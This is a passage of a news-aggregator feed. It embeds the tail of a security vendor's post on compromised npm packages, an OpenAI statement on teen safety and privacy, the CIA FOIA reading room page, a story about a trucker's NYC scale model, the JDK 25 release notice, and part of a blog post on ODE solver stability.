    &lt;p&gt;StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project's authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.&lt;/p&gt;
    &lt;p&gt;Learn more about implementing Artifact Monitor in your security workflow at https://docs.stepsecurity.io/artifact-monitor.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reference&lt;/head&gt;
    &lt;p&gt;â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised"/><published>2025-09-16T11:22:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261159</id><title>Robert Redford has died</title><updated>2025-09-16T16:11:55.234945+00:00</updated><content/><link href="https://www.nytimes.com/2025/09/16/movies/robert-redford-dead.html"/><published>2025-09-16T12:10:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261163</id><title>FBI couldn't get my husband to decrypt his Tor node so he was jailed for 3 years</title><updated>2025-09-16T16:11:55.193713+00:00</updated><content/><link href="https://old.reddit.com/r/TOR/comments/1ni5drm/the_fbi_couldnt_get_my_husband_to_decrypt_his_tor/"/><published>2025-09-16T12:10:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261659</id><title>Teen Safety, Freedom, and Privacy</title><updated>2025-09-16T16:11:55.000462+00:00</updated><content>&lt;doc fingerprint="311f117605a647b5"&gt;
  &lt;main&gt;
    &lt;p&gt;Some of our principles are in conflict, and we’d like to explain the decisions we are making around a case of tensions between teen safety, freedom, and privacy.&lt;/p&gt;
    &lt;p&gt;It is extremely important to us, and to society, that the right to privacy in the use of AI is protected. People talk to AI about increasingly personal things; it is different from previous generations of technology, and we believe that they may be one of the most personally sensitive accounts you’ll ever have. If you talk to a doctor about your medical history or a lawyer about a legal situation, we have decided that it’s in society’s best interest for that information to be privileged and provided higher levels of protection. We believe that the same level of protection needs to apply to conversations with AI which people increasingly turn to for sensitive questions and private concerns. We are advocating for this with policymakers.&lt;/p&gt;
    &lt;p&gt;We are developing advanced security features to ensure your data is private, even from OpenAI employees. Like privilege in other categories, there will be certain exceptions: for example, automated systems will monitor for potential serious misuse, and the most critical risks—threats to someone’s life, plans to harm others, or societal-scale harm like a potential massive cybersecurity incident—may be escalated for human review.&lt;/p&gt;
    &lt;p&gt;The second principle is about freedom. We want users to be able to use our tools in the way that they want, within very broad bounds of safety. We have been working to increase user freedoms over time as our models get more steerable. For example, the default behavior of our model will not lead to much flirtatious talk, but if an adult user asks for it, they should get it. For a much more difficult example, the model by default should not provide instructions about how to commit suicide, but if an adult user is asking for help writing a fictional story that depicts a suicide, the model should help with that request. “Treat our adult users like adults” is how we talk about this internally, extending freedom as far as possible without causing harm or undermining anyone else’s freedom.&lt;/p&gt;
    &lt;p&gt;The third principle is about protecting teens. We prioritize safety ahead of privacy and freedom for teens; this is a new and powerful technology, and we believe minors need significant protection.&lt;/p&gt;
    &lt;p&gt;First, we have to separate users who are under 18 from those who aren’t (ChatGPT is intended for people 13 and up). We’re building an age-prediction system to estimate age based on how people use ChatGPT. If there is doubt, we’ll play it safe and default to the under-18 experience. In some cases or countries we may also ask for an ID; we know this is a privacy compromise for adults but believe it is a worthy tradeoff.&lt;/p&gt;
    &lt;p&gt;We will apply different rules to teens using our services. For example, ChatGPT will be trained not to do the above-mentioned flirtatious talk if asked, or engage in discussions about suicide of self-harm even in a creative writing setting. And, if an under-18 user is having suicidal ideation, we will attempt to contact the users’ parents and if unable, will contact the authorities in case of imminent harm. We shared more today about how we’re building the age-prediction system and new parental controls to make all of this work.&lt;/p&gt;
    &lt;p&gt;We realize that these principles are in conflict and not everyone will agree with how we are resolving that conflict. These are difficult decisions, but after talking with experts, this is what we think is best and want to be transparent in our intentions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/teen-safety-freedom-and-privacy"/><published>2025-09-16T13:02:20+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261764</id><title>CIA Freedom of Information Act Electronic Reading Room</title><updated>2025-09-16T16:11:54.864944+00:00</updated><content>&lt;doc fingerprint="ff12d0edc8a52e8d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Freedom of Information Act Electronic Reading Room&lt;/head&gt;
    &lt;p&gt;Welcome to the Central Intelligence Agency's Freedom of Information Act Electronic Reading Room.&lt;/p&gt;
    &lt;head rend="h1"&gt;What is the Electronic Reading Room?&lt;/head&gt;
    &lt;head rend="h1"&gt;What's New on the Electronic Reading Room?&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Nixon and the People’s Republic of China: CIA’s Support of the Historic 1972 Presidential Trip&lt;/p&gt;
      &lt;p&gt;This collection marks the 50th anniversary of President Richard M. Nixon’s February 1972 trip to the People’s Republic of China (PRC) – a landmark event that preceded the establishment of diplomatic relations between the two countries. This small collection, consisting of three city guides, an atlas, and four leadership profiles, is a subset of the materials CIA produced for President Nixon and National Security Advisor Henry Kissinger in preparation for the seven-day visit.&lt;/p&gt;
      &lt;p&gt;City guides were produced on Peking (Beijing), Shanghai, and Hang-Chou (Hangzhou)1, as these cities were part of President Nixon’s tour of the PRC. Each guide included a brief history of the city, contemporary maps and photographs, and descriptions of geography, climates, and points of interest.&lt;/p&gt;
      &lt;p&gt;CIA also produced an 82-page atlas of the PRC for President Nixon’s trip. The US government distributed more than 4,000 copies to government customers and non-government institutions and libraries, and sold 30,000 copies to the public for a short period after the trip for $5.25, or $35.19 in today’s dollars. This is the first time in fifty years CIA has made the atlas available to the public.&lt;/p&gt;
      &lt;p&gt;This collection also includes leadership profiles—assessments that CIA provides US Presidents and other policymakers to assist them in understanding their foreign counterparts. The profiles in this collection include Chinese Communist Party (CCP) Chairman Mao Tse-tung (Mao Zedong) and Premier Chou En-lai (Zhou Enlai). A profile of Lin Piao (Lin Biao), Vice Chair of the CCP, prepared for this trip is also included in this collection; however, Lin died in a plane crash five months before President Nixon’s visit.&lt;/p&gt;
      &lt;p&gt;_____________________&lt;/p&gt;
      &lt;p&gt;1 CIA did not begin using the non-Romanization spelling of Beijing and Hangzhou until 1979. This article provides updated spellings elsewhere in parentheses.&lt;/p&gt;
      &lt;p&gt;See The Nixon Collection (8 documents/331 pages).&lt;/p&gt;
      &lt;p&gt;Current/Central Intelligence Bulletin Collection&lt;/p&gt;
      &lt;p&gt;Central Intelligence Bulletin&lt;/p&gt;
      &lt;p&gt;Harry Truman was the first U.S. president to receive a daily intelligence digest. At his direction, the Daily Summary began production in February 1946, and continued until February 1951. President Truman was pleased with the product, but a survey group commissioned by the National Security Council in 1949 was critical of the Daily Summary and issued several recommendations to improve it. The new version, called the Current Intelligence Bulletin, began production on 28 February 1951, and this remained the format of the president's daily digest through Dwight Eisenhower's two terms, although it was retitled the Central Intelligence Bulletin in 1958. The Current/Central Intelligence Bulletin grew longer than its predecessor over time with the addition of more items and more analysis, and would eventually contain more graphics as printing technology improved.&lt;/p&gt;
      &lt;p&gt;The new Kennedy Administration confronted a full array of international issues in 1961. In April, a group of CIA-trained Cuban exiles landed at the Bay of Pigs on the southern coast of Cuba with the goal of overthrowing the Fidel Castro regime and establishing an anti-Communist government. The outnumbered invading force was quickly repelled by Castro's troops. The year's reports were dominated by the worsening Congo crisis, with the fragmentation of the country widening despite the efforts of the United Nations, and US concern over the high tempo of Soviet testing of space vehicles and intercontinental ballistic missiles. The situation in Laos deteriorated, as the Communist Pathet Lao insurgency gained strength against the US-backed Royal Lao government.&lt;/p&gt;
      &lt;p&gt;The changes at the CIA following the Bay of Pigs included a format update for the president's daily intelligence report. The new version, called the President's Intelligence Checklist (PICL), was first delivered on 17 June 1961. The Central Intelligence Bulletin continued to be produced as a separate publication until 10 Jan 1974, when it was replaced by the National Intelligence Daily. The PICL, however, was the president's primary written intelligence source through the remainder of the Kennedy Administration. The Kennedy PICL reports are available here&lt;/p&gt;
      &lt;p&gt;This historical release includes: the Central Intelligence Bulletin reports from 2 January-30 June 1961 (2752 pages).&lt;/p&gt;
      &lt;p&gt;This release is the thirteenth and final release in the Current/Central Intelligence Bulletin series.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;aquiline adj. of or like the eagle.&lt;/p&gt;
      &lt;p&gt;Aerial intelligence collection platforms have played a critical role in US national security from the earliest beginnings of aviation. CIA's 1960s OXCART Program and its use of U-2s are examples of collection innovations that have kept US leaders informed about adversaries' capabilities and intentions. Despite their success, however, use of these platforms carried significant risks and repercussions, including detection and even pilot loss, such as the downing of the U-2 flown by Francis Gary Powers in 1960. Ever-evolving research by the CIA led to the development concept of unmanned aerial vehicles (UAVs) as collection platforms. An innovative Agency program in the 1960s codenamed Aquiline was the very first to test this concept. Based initially on the study of flight characteristics of birds, Aquiline was envisioned as a long-range vehicle that could safely and stealthily provide a window into denied areas such as the Soviet Union through photography and other capabilities, and would even support in-place agent operations. While it never became operational, the concept proved invaluable as a forerunner to today's multi-capability UAVs.&lt;/p&gt;
      &lt;p&gt;Learn more about CIA's early eagle (40 documents/289 pages).&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;This collection includes a broad sampling of articles from the National Intelligence Daily—the CIA's principal form of current intelligence analysis at the time—from February 1989 to March 1990. These articles represent much of the Agency's short-term analysis of events unfolding in Central and Eastern Europe as popular opposition to Soviet misrule erupted and quickly surpassed anything the Communist regimes were prepared to understand or to which they could respond. The material also represents a major source of information and insight for US policymakers into what was happening in these countries, where the situation was heading, and how a collapse of Communist rule in Europe and the beginnings of the breakup of the Soviet Union would impact Europe and the United States.&lt;/p&gt;
      &lt;p&gt;Please note: Some of the material is marked "NR" or "not relevant." This means that material is unrelated to events in Central and Eastern Europe, and was therefore not reviewed for declassification as part of this collection.&lt;/p&gt;
      &lt;p&gt;Learn more about the collapse of Communist rule in Europe (105 documents/151 pages)&lt;/p&gt;
    &lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.cia.gov/readingroom"/><published>2025-09-16T13:10:29+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261877</id><title>Trucker built a scale model of NYC over 21 years</title><updated>2025-09-16T16:11:54.701396+00:00</updated><content>&lt;doc fingerprint="3d9add1738a0ec3b"&gt;
  &lt;main&gt;
    &lt;p&gt;Reno may be “the biggest little city in the world,” but it's got some serious competition from the miniature New York City that hobbyist Joseph Macken built in his upstate New York basement over two decades.&lt;/p&gt;
    &lt;p&gt;“I sat down in my basement, turned the camera on on my phone and just started talking about my first section, which was Downtown Manhattan,” the Clifton Park resident said on a recent Thursday about his viral TikToks on his roughly 50-by-30-foot scale model of the city. “It just took off.”&lt;/p&gt;
    &lt;p&gt;The intricate model features what Macken says are hundreds of thousands buildings, landmarks and geographic elements across the five boroughs and their surroundings, including bridges, airports, the Hudson and East rivers, New York Harbor, Central Park, One World Trade Center and the original World Trade Center, the Statue of Liberty and Empire State Building. The work consists of 350 handmade sections that are pieced together and can be taken apart and moved.&lt;/p&gt;
    &lt;p&gt;Macken’s videos, which he began posting on TikTok this spring at his children’s urging, have garnered well over 20 million views and myriad praise in recent months. In them, he discusses his creative process and takes viewers on helicopter-like tours of his hometown.&lt;/p&gt;
    &lt;p&gt;“We’re about maybe 2,000 feet off the ground, looking down on all the houses and all the neighborhoods,” he says in a video posted earlier this week.&lt;/p&gt;
    &lt;p&gt;“This is genuinely unreal,” one commenter responded.&lt;/p&gt;
    &lt;p&gt;“Don't sell it for under $10 million,” another noted.&lt;/p&gt;
    &lt;p&gt;“A museum needs to display this ASAP,” YouTube’s official account commented on one of Macken’s clips in July.&lt;/p&gt;
    &lt;p&gt;Macken, a 63-year-old truck driver who grew up in Middle Village and has no formal carpentry or engineering training, said he dreamed of replicating the Queens Museum’s famous “Panorama” after an elementary school trip when he was a kid. He embarked on the endeavor in 2004, armed with little more than balsa wood, Elmer’s glue and Styrofoam. His first building was “the RCA building at Rockefeller Center,” he said, referring to 30 Rock, which was formerly named for its longtime tenant, the Radio Corporation of America.&lt;/p&gt;
    &lt;p&gt;Macken said it took him about 10 years to build Manhattan alone and 11 years for the rest of the boroughs. He completed his opus in April, and said he’s confident every building in the city is represented. (Gothamist could not independently verify this claim; the city has more than 1 million buildings, according to the Department of Buildings.)&lt;/p&gt;
    &lt;p&gt;“ I jumped outta my chair and I cheered,” Macken said of the moment he finished the last building, a house on Staten Island.&lt;/p&gt;
    &lt;p&gt;The project had outgrown Macken’s basement, but he’d built it so it could be broken down into panels and taken to a storage unit. He said it would have stayed there and collected dust if his kids had not encouraged him to get on TikTok and start sharing videos of the model.&lt;/p&gt;
    &lt;p&gt;Then, in early August, someone he delivered to on his truck route suggested he set up the model at a local event they were sponsoring. So Macken’s mini New York went up at the Cobleskill Fairgrounds near Albany, and can be seen there through Friday. It’s the first public display of the completed work.&lt;/p&gt;
    &lt;p&gt;Macken is now working on a mini Minneapolis: “‘Mary Tyler Moore’ was one of my favorite shows growing up,” he said, adding that he plans to eventually do Los Angeles, Las Vegas and Chicago as well.&lt;/p&gt;
    &lt;p&gt;Some fans said they drove from as far as Baltimore to see the mini NYC in person.&lt;/p&gt;
    &lt;p&gt;“Pictures do not do justice. This was a masterpiece to witness in person today and well worth the three-and-a-half-hour drive,” one TikTok user commented.&lt;/p&gt;
    &lt;p&gt;Macken said he’s still figuring out what he’ll do next with the model, but he’s in talks with the Museum of the City of New York in Manhattan about an exhibit there. A museum spokesperson confirmed this, praising his “ingenuity, creativity and skill.”&lt;/p&gt;
    &lt;p&gt;“ I don't wanna put it back in storage,” Macken said. “That's for damn sure.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://gothamist.com/arts-entertainment/this-trucker-built-a-scale-model-of-nyc-over-21-years-its-drawing-museums-attention"/><published>2025-09-16T13:20:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261930</id><title>Generative AI is hollowing out entry-level jobs, study finds</title><updated>2025-09-16T16:11:54.598806+00:00</updated><content/><link href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555"/><published>2025-09-16T13:24:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261946</id><title>Java 25 Officially Released</title><updated>2025-09-16T16:11:54.214248+00:00</updated><content>&lt;doc fingerprint="fd93fbb3c405b21b"&gt;
  &lt;main&gt;
    &lt;p&gt;JDK 25, the reference implementation of Java 25, is now Generally Available. We shipped build 36 as the second Release Candidate of JDK 25 on 15 August, and no P1 bugs have been reported since then. Build 36 is therefore now the GA build, ready for production use. GPL-licensed OpenJDK builds from Oracle are available here: https://jdk.java.net/25 Builds from other vendors will no doubt be available soon. This release includes eighteen JEPs [1]: 470: PEM Encodings of Cryptographic Objects (Preview) 502: Stable Values (Preview) 503: Remove the 32-bit x86 Port 505: Structured Concurrency (Fifth Preview) 506: Scoped Values 507: Primitive Types in Patterns, instanceof, and switch (Third Preview) 508: Vector API (Tenth Incubator) 509: JFR CPU-Time Profiling (Experimental) 510: Key Derivation Function API 511: Module Import Declarations 512: Compact Source Files and Instance Main Methods 513: Flexible Constructor Bodies 514: Ahead-of-Time Command-Line Ergonomics 515: Ahead-of-Time Method Profiling 518: JFR Cooperative Sampling 519: Compact Object Headers 520: JFR Method Timing &amp;amp; Tracing 521: Generational Shenandoah This release also includes, as usual, hundreds of smaller enhancements and thousands of bug fixes. Thanks to everyone who contributed this release, whether by designing and implementing features or enhancements, by fixing bugs, or by testing the early-access builds! - Mark [1] https://openjdk.org/projects/jdk/25/&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mail.openjdk.org/pipermail/announce/2025-September/000360.html"/><published>2025-09-16T13:25:42+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45262151</id><title>Implicit Ode Solvers Are Not Universally More Robust Than Explicit Ode Solvers</title><updated>2025-09-16T16:11:53.889265+00:00</updated><content>&lt;doc fingerprint="3f09c854abe7bb95"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Implicit ODE Solvers Are Not Universally More Robust than Explicit ODE Solvers, Or Why No ODE Solver is Best&lt;/head&gt;
    &lt;head rend="h4"&gt;September 4 2025 in Differential Equations, Julia, Mathematics, Programming | Tags: bdf, euler, explicit, implicit, numerical analysis, ode, runge-kutta, solver | Author: Christopher Rackauckas&lt;/head&gt;
    &lt;p&gt;A very common adage in ODE solvers is that if you run into trouble with an explicit method, usually some explicit Runge-Kutta method like RK4, then you should try an implicit method. Implicit methods, because they are doing more work, solving an implicit system via a Newton method having “better” stability, should be the thing you go to on the “hard” problems.&lt;/p&gt;
    &lt;p&gt;This is at least what I heard at first, and then I learned about edge cases. Specifically, you hear people say “but for hyperbolic PDEs you need to use explicit methods”. You might even intuit from this “PDEs can have special properties, so sometimes special things can happen with PDEs… but ODEs, that should use implicit methods if you need more robustness”. This turns out to not be true, and really understanding the ODEs will help us understand better why there are some PDE semidiscretizations that have this “special cutout”.&lt;/p&gt;
    &lt;p&gt;What I want to do in this blog post is more clearly define what “better stability” actually means, and show that it has certain consequences that can sometimes make explicit ODE solvers actually more robust on some problems. And not just some made-up problems, lots of real problems that show up in the real world.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Quick Primer on Linear ODEs&lt;/head&gt;
    &lt;p&gt;First, let’s go through the logic of why implicit ODE solvers are considered to be more robust, which we want to define in some semi-rigorous way as “having a better chance to give an answer closer to the real answer”. In order to go from semi-rigorous into a rigorous definition, we can choose a test function, and what better test function to use than a linear ODE. So let’s define a linear ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = \lambda u$$&lt;/p&gt;
    &lt;p&gt;is the simplest ODE. We can even solve it analytically, $u(t) = \exp(\lambda t)u(0)$. For completeness, we can generalize this to a linear system of ODEs, where instead of having a scalar $u$ we can let $u$ be a vector, in which case the linear ODE has a matrix of parameters $A$, i.e.&lt;/p&gt;
    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;In this case, if $A$ is diagonalizable, $A = P^{-1}DP$, then we can replace $A$:&lt;/p&gt;
    &lt;p&gt;$$u’ = P^{-1}DP u$$&lt;/p&gt;
    &lt;p&gt;$$Pu’ = DPu$$&lt;/p&gt;
    &lt;p&gt;or if we let $w = Pu$, then&lt;/p&gt;
    &lt;p&gt;$$w’ = Dw$$&lt;/p&gt;
    &lt;p&gt;where $D$ is a diagonal matrix. This means that for every element of $w$ we have the equation:&lt;/p&gt;
    &lt;p&gt;$$w_i’ = \lambda_i w_i$$&lt;/p&gt;
    &lt;p&gt;where $w_i$ is the vector in the direction of the $i$th eigenvector of $A$, and $\lambda_i$ is the $i$th eigenvalue of $A$. Thus our simple linear ODE $u’ = \lambda u$ tells us about general linear systems along the eigenvectors. Importantly, since even for real $A$ we can have $\lambda$ be a complex number, i.e. real-valued matrices can have complex eigenvalues, it’s important to allow for $\lambda$ to be complex to understand all possible systems.&lt;/p&gt;
    &lt;p&gt;But why is this important for any other ODE? Well by the Hartman-Grobman theorem, for any sufficiently nice ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = f(u)$$&lt;/p&gt;
    &lt;p&gt;We can locally approximate the ODE by:&lt;/p&gt;
    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;where $A = f'(u)$, i.e. $A$ is the linear system defined by the Jacobian local to the point. This is effectively saying any “sufficiently nice” system (i.e. if $f$ isn’t some crazy absurd function and has properties like being differentiable), you can understand how things locally move by looking at the system approximated by a linear system, where the right linear approximation is given by the Jacobian. And we know that linear systems then boil down generally to just the scalar linear system, and so understanding the behavior of a solver on the scalar linear system tells us a lot about how it will do “for small enough h”.&lt;/p&gt;
    &lt;p&gt;Okay, there are lots of unanswered questions, such as what if $A$ is not diagonalizable? What if $f$ is not differentiable? What if the system is very nonlinear so the Jacobian changes very rapidly? But under assumptions that things are nice enough, we can say that if a solver does well on $u’ = \lambda u$ then it is probably some idea of good.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why implicit ODE solvers are “better”, i.e. more robust&lt;/head&gt;
    &lt;p&gt;So now we have a metric by which we can analyze ODEs: if they have good behavior on $u’ = \lambda u$, then they are likely to be good in general. So what does it mean to have good behavior on $u’ = \lambda u$? One nice property would be to at least be asymptotically correct for the most basic statement, i.e. does it go to zero when it should? If you have $u’ = \lambda u$ and $\lambda$ is negative, then the analytical solution $u(t) = \exp(\lambda t)u(0)$ goes to zero as $t$ goes to infinity. So a good question to ask is, for a given numerical method, for what values of $h$ (the time step size) does the numerical method give a solution that goes to zero, and for which $h$ does it get an infinitely incorrect answer?&lt;/p&gt;
    &lt;p&gt;To understand this, we just take a numerical method and plug in the test equation. So the first thing to look at is Euler’s method. For Euler’s method, we step forward by $h$ by assuming the derivative is constant along the interval, or:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;When does this method give a solution that is asymptotically consistent? With a little bit of algebra:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_n$$&lt;/p&gt;
    &lt;p&gt;Let $z = h\lambda$, which means&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + z) u_n$$&lt;/p&gt;
    &lt;p&gt;This is a discrete dynamical system which has the analytical solution:&lt;/p&gt;
    &lt;p&gt;$$u_n = u_0 (1+z)^{n}$$&lt;/p&gt;
    &lt;p&gt;Note that if $1 + z &amp;gt; 1$, then $(1+z)^n$ keeps growing as $n$ increases, so this goes to infinity, while if $1 + z &amp;lt; 1$ it goes to zero. But since $\lambda$ can actually be a complex number, the analysis is a little bit more complex (pun intended), but it effectively means that if $z$ is in the unit circle shifted to the left in the complex plane by 1, then $u_n \rightarrow 0$. This gives us the definition of the stability region, $G(z)$ is the region for which $u_n \rightarrow 0$, and this is the shifted unit circle in the complex plane for explicit Euler.&lt;/p&gt;
    &lt;p&gt;This shows a pretty bad property for this method. For any given $\lambda$ with negative real part, there is a maximum $h$, actually $h = 1/\lambda$, such that for any larger step size we don’t just get a bad answer, we can get an infinitely bad answer, i.e. the analytical solution goes to zero but the numerical solution goes to infinity!&lt;/p&gt;
    &lt;p&gt;So, is there a method that doesn’t have this bad property? In comes the implicit methods. If you run the same analysis with implicit Euler,&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_{n+1})$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_{n+1}$$&lt;/p&gt;
    &lt;p&gt;$$(1-z) u_{n+1} = u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;Then we have almost an “inverse” answer, i.e. $G(z)$ is everything except the unit circle in the complex plane shifted to the right. This means that for any $\lambda$ with negative real part, for any $h$ the implicit Euler method has $u_n \rightarrow 0$, therefore it’s never infinitely wrong.&lt;/p&gt;
    &lt;p&gt;Therefore it’s just better, QED.&lt;/p&gt;
    &lt;p&gt;This then generalizes to more advanced methods. For example, the stability region of RK4&lt;/p&gt;
    &lt;p&gt;an explicit method has a maximum $h$, while the stability region of BDF2&lt;/p&gt;
    &lt;p&gt;an implicit method does not. You can even prove it’s impossible for any explicit method to have this “good” property, so “implicit methods are better”. QED times 2, done deal.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second, what about that other “wrongness”?&lt;/head&gt;
    &lt;p&gt;Any attentive student should immediately throw their hand up. “Teacher, given the $G(z)$ you said, you also have that for any $\lambda$ where $\text{Re}(\lambda)&amp;gt;1$, you also have that $u_n \rightarrow 0$, but in reality the analytical solution has $u(t) \rightarrow \infty$, so implicit Euler is infinitely wrong! And explicit Euler has the correct asymptotic behavior since it goes to infinity!”&lt;/p&gt;
    &lt;p&gt;That is completely correct! But it can be easy to brush this off with “practical concerns”. If you have a real model which has positive real eigenvalues like that, then it’s just going to explode to infinity. Those kinds of models aren’t really realistic? Energy goes to infinity, angular momentum goes to infinity, the chemical concentration goes to infinity: whatever you’re modeling just goes crazy! If you’re in this scenario, then your model is probably wrong. Or if the model isn’t wrong, the numerical methods aren’t very good anyways. If you analyze the error propagation properties, you’ll see the error of the numerical method also increases exponentially! So this is a case you shouldn’t be modeling anyways.&lt;/p&gt;
    &lt;head rend="h2"&gt;Seeing this robustness in practice&lt;/head&gt;
    &lt;p&gt;Therefore if you need a more accurate result, use an implicit method. And you don’t need to go to very difficult models to see this manifest in practice. Take the linear ODE:&lt;/p&gt;
    &lt;p&gt;$$T’ = 5(300-T)$$&lt;/p&gt;
    &lt;p&gt;with $T(0) = 320$. This is a simple model of cooling an object with a constant temperature influx. It’s easy to analytically solve, you just have an exponential fall in the temperature towards $T = 300$ the steady state. But when we solve it with an explicit method at default tolerances, that’s not what we see:&lt;/p&gt;
    &lt;quote&gt;using OrdinaryDiffEq function cooling(du,u,p,t) du[1] = 5.0*(300-u[1]) end u0 = [310.0] tspan = (0.0,10.0) prob = ODEProblem(cooling, u0, tspan) sol = solve(prob, Tsit5()) using Plots plot(sol, title="RK Method, Cooling Problem") savefig("rk_cooling.png")&lt;/quote&gt;
    &lt;p&gt;We see that the explicit method gives oscillations in the solution! Meanwhile, if we take a “robust” implicit method like the BDF method from the classic C++ library SUNDIALS, we can solve this:&lt;/p&gt;
    &lt;quote&gt;using Sundials sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method, Cooling Problem") savefig("bdf_cooling.png")&lt;/quote&gt;
    &lt;p&gt;Sure it’s not perfectly accurate, but at least it doesn’t give extremely wrong behavior. We can decrease tolerances to make this all go away,&lt;/p&gt;
    &lt;p&gt;But the main point is that the explicit method is just generally “less robust”, you have to be more careful, it can give things that are just qualitatively wrong.&lt;/p&gt;
    &lt;p&gt;This means that “good tools”, tools that have a reputation for robustness, they should default to just using implicit solvers because that’s going to be better. And you see that in tools like Modelica. For example, the Modelica University’s playground and other tools in the space like OpenModelica and Dymola, default to implicit solvers like DASSL. And you can see they do great on this problem by default!&lt;/p&gt;
    &lt;p&gt;Modelica tools gives a good answer out of the box.&lt;/p&gt;
    &lt;p&gt;So QED, that’s the “right thing to do”: if you want to be robust, stick to implicit methods.&lt;/p&gt;
    &lt;head rend="h2"&gt;But why oscillations?&lt;/head&gt;
    &lt;p&gt;Hold up a bit… why does the explicit method give oscillations? While we know that’s wrong, it would be good to understand why it gives the qualitatively wrong behavior that it does. It turns out that this falls right out of the definition of the method. If you go back to the definition of explicit Euler on the test problem, i.e.&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;then substitute in:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_{n}$$&lt;/p&gt;
    &lt;p&gt;If we think about our stability criteria $G(z)$ another way, its boundaries are exactly the value by which the next $u_{n+1}$ would have a negative real part. So the analytical solution is supposed to go to zero, but the “bad” behavior is when we choose a step size $h$ such that if we extrapolate out with a straight line for $h$ long in time, then we will “jump” over this zero, something that doesn’t happen in the analytical solution. But now let’s think about what happens in that case. If you jump over zero, then $u_n &amp;lt; 0$ (think real right now), so therefore the derivative of the next update points in the other direction, i.e. we're still going towards zero, but now from the negative side we go up to zero. But since $\|1 + h\lambda\| &amp;gt; 1$, we have that $\|u_{n+1}\| &amp;gt; \|u_n\|$, i.e. the norm of the solution keeps growing. So you jump from positive to negative, then negative to positive, then positive to negative, where the jumps are growing each time. This is the phantom oscillations of the explicit ODE solver!&lt;/p&gt;
    &lt;p&gt;So what’s happening is the default tolerances of the explicit ODE solver were large enough that the chosen $h$s were in the range of the phantom oscillation behavior, and so you just need to cap $h$ below that value, which is dependent on the real part of the eigenvalue of $h$ (you can do the same analysis with complex numbers, but that just gives rotations in the complex plane along with the real part oscillation).&lt;/p&gt;
    &lt;p&gt;But if explicit methods give oscillations, what’s going on with implicit ODE solvers with large $h$? Let’s look at the update equation again:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;now instead of multiplying each time by $(1-z)$, we divide by it. This means that when $\lambda &amp;lt; 0$ (or $\text{Re}(\lambda) &amp;lt; 0$ to be more exact), then for any $h$ we have that $\|u_{n+1}\| &amp;lt; \|u_{n}\|$. Therefore, we might jump over the zero with a big enough $h$, but we are guaranteed that our "jump size" is always shrinking. Thus for any $h$, we will get to zero because we're always shrinking in absolute value. This means that implicit methods are working because they have a natural dampening effect. So:&lt;/p&gt;
    &lt;head rend="h4"&gt;Explicit methods introduce spurious oscillations, but implicit methods naturally damp oscillations&lt;/head&gt;
    &lt;p&gt;This explains in more detail why we saw what we saw: the explicit method when the error tolerance is sufficiently high will introduce oscillations that don’t exist, while the implicit method will not have this behavior. This is a more refined version of the “energy doesn’t go to infinity!”, now it’s “energy doesn’t come from nowhere in real systems”, and because of this implicit solvers give a better qualitative answer. This is why they are more robust, which is why robust software for real engineers just always default to them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second… do we always want that?&lt;/head&gt;
